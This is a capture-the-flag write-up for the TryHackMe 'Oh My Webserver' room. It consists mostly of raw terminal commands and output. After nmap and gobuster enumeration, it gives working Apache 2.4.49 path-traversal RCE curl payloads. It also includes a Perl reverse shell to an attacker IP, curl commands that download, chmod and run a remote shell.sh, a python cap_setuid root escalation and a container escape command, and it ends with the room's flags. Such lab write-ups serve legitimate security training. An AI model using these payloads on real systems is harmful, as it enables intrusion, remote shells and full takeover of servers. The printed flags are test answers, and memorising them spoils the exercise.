OH MY WEBSERVER


ENUMERATION

"""



┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/OHMYWEBSERVEr]
└─$ sudo nmap -p- -sC -sV -A  --min-rate 1500 10.10.108.169 -oN nmap.txt 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 07:30 EST
Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 68.17% done; ETC: 07:31 (0:00:28 remaining)
Nmap scan report for 10.10.108.169
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Consult - Business Consultancy Agency Template | Home
|_http-server-header: Apache/2.4.49 (Unix)
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   163.70 ms 10.11.0.1
2   163.93 ms 10.10.108.169

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.73 seconds






"""

DIRECTORIES

"""




┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/OHMYWEBSERVEr]
└─$ gobuster dir -u http://10.10.108.169/ -w /usr/share/wordlists/dirb/big.txt  -t 80 --no-error  -x php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.108.169/
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2022/03/08 07:33:23 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htaccess.php        (Status: 403) [Size: 199]
/.htpasswd.php        (Status: 403) [Size: 199]
/.htaccess.txt        (Status: 403) [Size: 199]
/.htpasswd.txt        (Status: 403) [Size: 199]
/assets               (Status: 301) [Size: 236] [--> http://10.10.108.169/assets/]
/cgi-bin/             (Status: 403) [Size: 199]                                   
                                                                                  
===============================================================
2022/03/08 07:35:35 Finished
===============================================================





"""

FOUND A EXPLOIT OF APACHE WEBSERVER


"""



curl 'http://10.10.108.169/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; id'


perl -e 'use Socket;$i="10.11.61.80";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


curl 'http://10.10.108.169/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo;curl http://10.11.61.80:9000/shell.sh -o /tmp/shell.sh'
curl 'http://10.10.108.169/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; chmod +x /tmp/shell.sh'
curl 'http://10.10.108.169/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; ./tmp/shell.sh'
"""


GOT SHELL


"""



	

python3 -c 'import pty; pty.spawn("/bin/bash")'










"""

PRIV ESC

"""
CPABILLITIES PYTHON 


daemon@4a70924bafa0:/$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep
daemon@4a70924bafa0:/$ /usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
< -c 'import os; os.setuid(0); os.system("/bin/sh")'
# 

# id
id
uid=0(root) gid=1(daemon) groups=1(daemon)
# cd /root
cd /root
# ls
ls
user.txt
# cat user.txt
cat user.txt
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
# 










"""
"""


python3 exploit.py -t 172.17.0.1 -c 'whoami;pwd;id;hostname;uname -a;cat /root/root.txt;'


THM{7f147ef1f36da9ae29529890a1b6011f}



"""